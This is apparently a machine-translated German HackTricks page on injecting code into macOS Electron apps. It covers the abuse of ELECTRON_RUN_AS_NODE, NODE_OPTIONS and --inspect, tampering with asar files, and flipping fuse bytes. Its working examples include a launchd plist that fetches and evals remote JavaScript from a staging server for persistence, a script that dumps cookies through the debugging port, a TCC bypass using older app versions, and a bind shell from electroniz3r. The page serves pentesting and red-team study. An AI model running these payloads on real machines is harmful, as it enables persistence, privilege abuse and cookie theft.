# macOS Electron-Anwendungen Injektion

{% hint style="success" %}
Lernen und üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen und üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## Grundlegende Informationen

Wenn Sie nicht wissen, was Electron ist, finden Sie [**hier viele Informationen**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Aber für den Moment wissen Sie einfach, dass Electron **node** ausführt.\
Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **es dazu zu bringen, anderen Code auszuführen** als die angegebene Datei.

### Electron-Sicherungen

Diese Techniken werden als nächstes diskutiert, aber in letzter Zeit hat Electron mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron-Sicherungen**](https://www.electronjs.org/docs/latest/tutorial/fuses) und diese werden verwendet, um zu verhindern, dass Electron-Apps in macOS **beliebigen Code laden**:

* **`RunAsNode`**: Wenn deaktiviert, verhindert es die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** zum Einspritzen von Code.
* **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect`, `--inspect-brk` nicht respektiert. Auf diese Weise wird das Einspritzen von Code vermieden.
* **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`**-**Datei** von macOS **validiert**. Auf diese Weise wird das Einspritzen von Code verhindert, indem der Inhalt dieser Datei geändert wird.
* **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird anstelle der Suche nach dem Laden in folgender Reihenfolge: **`app.asar`**, **`app`** und schließlich **`default_app.asar`** nur app.asar überprüft und verwendet. Dadurch wird sichergestellt, dass bei **Kombination** mit der **`embeddedAsarIntegrityValidation`**-Sicherung es **unmöglich** ist, **nicht validierten Code zu laden**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browserprozess die Datei namens `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.

Eine weitere interessante Sicherung, die das Einspritzen von Code nicht verhindern wird, ist:

* **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mithilfe von kryptografischen Schlüsseln auf OS-Ebene verschlüsselt.

### Überprüfen der Electron-Sicherungen

Sie können diese Flags von einer Anwendung aus überprüfen:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifizieren von Electron-Sicherungen

Wie in den [**Dokumenten erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), werden die Konfigurationen der **Electron-Sicherungen** innerhalb der **Electron-Binärdatei** konfiguriert, die irgendwo den String **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.

In macOS-Anwendungen befindet sich dies normalerweise in `Anwendung.app/Inhalte/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Sie könnten diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach dem vorherigen String suchen. Nach diesem String können Sie im ASCII-Format eine Zahl "0" oder "1" sehen, die angibt, ob jede Sicherung deaktiviert oder aktiviert ist. Ändern Sie einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um **die Sicherungswerte zu ändern**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Beachten Sie, dass wenn Sie versuchen, die **`Electron Framework`-Binärdatei** innerhalb einer Anwendung mit diesen geänderten Bytes zu **überschreiben**, die App nicht gestartet wird.

## RCE Hinzufügen von Code zu Electron-Anwendungen

Es könnten **externe JS/HTML-Dateien** vorhanden sein, die eine Electron-App verwendet. Ein Angreifer könnte also Code in diese Dateien einschleusen, dessen Signatur nicht überprüft wird, und beliebigen Code im Kontext der App ausführen.

{% hint style="danger" %}
Es gibt jedoch derzeit 2 Einschränkungen:

* Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist **erforderlich**, um eine App zu modifizieren, daher ist dies standardmäßig nicht mehr möglich.
* Die kompilierte **`asap`**-Datei hat normalerweise die Sicherungen **`embeddedAsarIntegrityValidation`** und **`onlyLoadAppFromAsar`** aktiviert.

Dies macht diesen Angriffsweg komplizierter (oder unmöglich).
{% endhint %}

Beachten Sie, dass es möglich ist, die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** zu umgehen, indem Sie die Anwendung in ein anderes Verzeichnis kopieren (wie **`/tmp`**), den Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenennen, die **asar**-Datei mit Ihrem **bösartigen** Code ändern, sie wieder in **`app.app/Contents`** umbenennen und ausführen.

Sie können den Code aus der asar-Datei entpacken mit:
```bash
npx asar extract app.asar app-decomp
```
Und packen Sie es nach der Modifikation wieder mit:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE mit `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Gemäß [**der Dokumentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) wird, wenn diese Umgebungsvariable gesetzt ist, der Prozess als normaler Node.js-Prozess gestartet.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Wenn die Sicherung **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert und dies funktioniert nicht.
{% endhint %}

### Injektion aus der App-Plist

Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) könnten Sie diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz aufrechtzuerhalten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE mit `NODE_OPTIONS`

Sie können das Payload in einer anderen Datei speichern und ausführen:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Wenn die Sicherung **`EnableNodeOptionsEnvironmentVariable`** **deaktiviert** ist, wird die App die Umgebungsvariable **NODE\_OPTIONS** beim Start **ignorieren**, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, was auch **ignoriert** wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.

Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, erhalten Sie den **Fehler**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Injektion aus der App-Plist

Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um Persistenz hinzuzufügen, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE mit Inspektion

Gemäß [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) Artikel, wenn Sie eine Electron-Anwendung mit Flaggen wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen, wird ein **Debug-Port geöffnet**, sodass Sie sich damit verbinden können (zum Beispiel von Chrome aus unter `chrome://inspect`) und Sie werden in der Lage sein, **Code einzuspritzen** oder sogar neue Prozesse zu starten.\
Zum Beispiel:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Wenn die Sicherung **`EnableNodeCliInspectArguments`** deaktiviert ist, ignoriert die App **Node-Parameter** (wie `--inspect`), wenn sie gestartet wird, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls **ignoriert** wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.

Sie könnten jedoch immer noch den **Electron-Parameter `--remote-debugging-port=9229`** verwenden, aber das vorherige Payload funktioniert nicht, um andere Prozesse auszuführen.
{% endhint %}

Durch die Verwendung des Parameters **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-App zu stehlen, wie die **Verlauf** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie im Browser **entschlüsselt** sind und es einen **JSON-Endpunkt** gibt, der sie liefert).

Sie können lernen, wie das geht in [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) und das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Skript wie:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**diesem Blogbeitrag**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen headless Chrome **beliebige Dateien an beliebigen Orten herunterladen zu lassen**.

### Injection aus der App-Plist

Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um Persistenz zu erhalten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Umgehung durch Ausnutzung älterer Versionen

{% hint style="success" %}
Der TCC-Dämon von macOS überprüft nicht die ausgeführte Version der Anwendung. Wenn Sie also **keinen Code in einer Electron-Anwendung injizieren können** mit einer der vorherigen Techniken, könnten Sie eine frühere Version der APP herunterladen und Code darauf injizieren, da sie immer noch die TCC-Berechtigungen erhält (sofern der Trust Cache dies nicht verhindert).
{% endhint %}

## Ausführen von nicht-JS-Code

Die vorherigen Techniken ermöglichen es Ihnen, **JS-Code im Prozess der Electron-Anwendung auszuführen**. Denken Sie jedoch daran, dass die **Unterprozesse unter demselben Sandbox-Profil wie die übergeordnete Anwendung ausgeführt werden** und **deren TCC-Berechtigungen erben**.\
Daher könnten Sie, wenn Sie Berechtigungen missbrauchen möchten, um beispielsweise auf Kamera oder Mikrofon zuzugreifen, einfach **eine andere Binärdatei aus dem Prozess heraus ausführen**.

## Automatische Injektion

Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann einfach verwendet werden, um **anfällige Electron-Anwendungen** zu finden, die installiert sind, und Code darauf zu injizieren. Dieses Tool wird versuchen, die **`--inspect`**-Technik zu verwenden:

Sie müssen es selbst kompilieren und können es wie folgt verwenden:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referenzen

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Lernen & Üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & Üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys senden.

</details>
{% endhint %}
